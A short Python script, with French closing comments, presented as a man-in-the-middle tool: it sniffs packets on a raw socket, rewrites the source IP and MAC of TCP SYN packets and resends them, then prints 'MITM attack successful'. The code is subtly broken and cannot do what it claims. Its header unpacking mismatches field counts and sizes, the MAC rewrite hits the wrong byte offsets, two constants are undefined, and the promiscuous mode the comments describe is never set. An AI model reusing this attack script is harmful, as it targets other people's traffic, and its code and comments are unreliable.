# Import the required modules
import socket
import struct
import sys

# Create a raw socket
raw_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))

# Bind the socket to the interface
raw_sock.bind(("eth0", socket.htons(0x0800)))

# Receive packets until interrupted
while True:
  # Receive a packet from the network
  packet = raw_sock.recvfrom(2048)

  # Extract the ethernet frame from the packet
  ethernet_frame = packet[0][0:14]

  # Extract the source and destination MAC addresses from the ethernet frame
  src_mac, dest_mac, proto = struct.unpack("! 6s 6s H", ethernet_frame)

  # Check if the packet is an IP packet (protocol 0x0800)
  if proto == 0x0800:
    # Extract the IP header and data from the packet
    ip_header = packet[0][14:34]
    data = packet[0][34:]

    # Unpack the IP header
    version, tos, length, id, flags, offset, ttl, proto, checksum, src_ip, dest_ip = struct.unpack("!BBHHHBBHIIII", ip_header)

    # Check if the packet is a TCP packet (protocol 6)
    if proto == 6:
      # Extract the TCP header and data from the packet
      tcp_header = packet[0][34:54]
      data = packet[0][54:]

      # Unpack the TCP header
      src_port, dest_port, seq, ack, offset, flags, window, checksum, urgent = struct.unpack("!HHLLBBHHH", tcp_header)

  # Check if the packet is a SYN packet (flag 0x02)
  if flags == 0x02:
    # Modify the source IP and MAC addresses in the packet
    modified_packet = list(packet[0])
    modified_packet[26:30] = struct.pack("!I", socket.htonl(IP_ADDRESS))
    modified_packet[22:28] = MAC_ADDRESS
    modified_packet = bytes(modified_packet)

    # Send the modified packet to the network
    raw_sock.sendto(modified_packet, packet[1])

    # Print a message
    print("MITM attack successful")

# Ce script utilise un socket raw en mode promiscuous pour capturer les paquets sur un réseau local.
# Il recherche les paquets TCP SYN et modifie l'adresse IP et MAC source avant de les renvoyer sur le réseau.
# Cela permet d'intercepter les connexions entre les hôtes et de les rediriger vers l'ordinateur qui exécute le script.
